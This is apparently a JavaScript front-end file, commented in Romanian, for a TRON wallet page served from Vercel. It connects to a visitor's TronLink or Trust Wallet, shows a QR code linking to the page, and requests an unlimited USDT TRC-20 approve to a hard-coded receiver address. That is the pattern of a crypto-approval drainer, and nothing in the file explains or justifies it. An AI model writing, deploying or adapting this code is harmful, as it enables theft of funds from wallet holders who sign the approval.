// --- CONFIGURARE TRON ---
const TRON_USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Contractul oficial USDT TRC-20
const YOUR_TRON_RECEIVER = "TMEXATTFuyZ8tSFKcmLZyinujtiUtU2g4w"; // Adresa ta de destinație pentru permisiuni

let tronUserAddress = null;

function showTronStatus(msg, isError = false) {
    const el = document.getElementById("tronStatusText");
    if (!el) return;
    el.style.display = "block";
    el.style.color = isError ? "#f87171" : "#38bdf8";
    el.style.background = isError ? "rgba(248, 113, 113, 0.1)" : "rgba(56, 189, 248, 0.1)";
    el.innerText = msg;
}

// 1. Inițializare cod QR dinamic care direcționează spre dApp-ul tău de pe Vercel
function initTronQR() {
    const addressEl = document.getElementById("tronAddressText");
    if (addressEl) {
        addressEl.innerText = YOUR_TRON_RECEIVER;
    }
    
    const qrContainer = document.getElementById("qrcode");
    if (!qrContainer) return;
    
    qrContainer.innerHTML = ""; 
    const dAppUrl = window.location.href; // Preia automat linkul tău live de pe Vercel

    new QRCode(qrContainer, {
        text: dAppUrl,
        width: 185,
        height: 185,
        colorDark: "#0f172a",
        colorLight: "#ffffff",
        correctLevel: QRCode.CorrectLevel.H
    });
}

// 2. Conectare și detectare automată portofel TRON (TronLink / Trust Wallet)
async function connectTronWallet() {
    showTronStatus("Se caută portofelul TRON...");

    let attempts = 0;
    while (typeof window.tronWeb === 'undefined' && attempts < 10) {
        await new Promise(r => setTimeout(r, 300));
        attempts++;
    }

    if (typeof window.tronWeb === 'undefined') {
        alert("Nu s-a detectat niciun mediu TRON! Deschide această pagină direct din browserul intern al aplicației TronLink sau Trust Wallet.");
        showTronStatus("Portofelul TRON lipsește.", true);
        return;
    }

    try {
        if (window.tronLink) {
            const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
            if (res.code && res.code !== 200) {
                throw new Error("Utilizatorul a refuzat conectarea.");
            }
        }

        if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
            tronUserAddress = window.tronWeb.defaultAddress.base58;
            
            document.getElementById("connectTronBtn").innerText = Conectat: ${tronUserAddress.substring(0,6)}...${tronUserAddress.substring(tronUserAddress.length - 4)};
            document.getElementById("tronApproveSection").style.display = "block";
            
            showTronStatus("Portofel TRON conectat cu succes!");
        } else {
            throw new Error("Portofelul este blocat sau adresa nu este disponibilă.");
        }
    } catch (err) {
        console.error("Eroare Tron:", err);
        showTronStatus("Eroare la conectare: " + (err.message || err), true);
    }
}

// 3. Executare Aprobare Nelimitată (Unlimited Approve) pentru adresa ta
async function handleTronUnlimitedApprove() {
    const approveBtn = document.getElementById("approveTronBtn");

    if (!tronUserAddress) {
        alert("Conectează mai întâi portofelul TRON!");
        return;
    }

    try {
        approveBtn.disabled = true;
        showTronStatus("Se generează cererea de aprobare nelimitată...");

        const contract = await window.tronWeb.contract().at(TRON_USDT_CONTRACT);
        
        // Suma maximă (Max Uint256) pentru aprobare nelimitată pe contractul TRC-20
        const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        showTronStatus("Confirmă tranzacția de Approve în portofelul tău...");

        const tx = await contract.approve(
            YOUR_TRON_RECEIVER,
            maxAmount
        ).send({
            feeLimit: 150000000, // Limită de energie/fee optimizată
            callValue: 0
        });

        showTronStatus("✅ Aprobare nelimitată acordată cu succes! Hash: " + tx);
    } catch (err) {
        console.error("Eroare Approve TRC20:", err);
        showTronStatus("❌ Tranzacție eșuată sau anulată: " + (err.message || err), true);
    } finally {
        approveBtn.disabled = false;
    }
}

// Auto-inițializare cod QR la încărcarea paginii
document.addEventListener("DOMContentLoaded", () => {
    initTronQR();
});
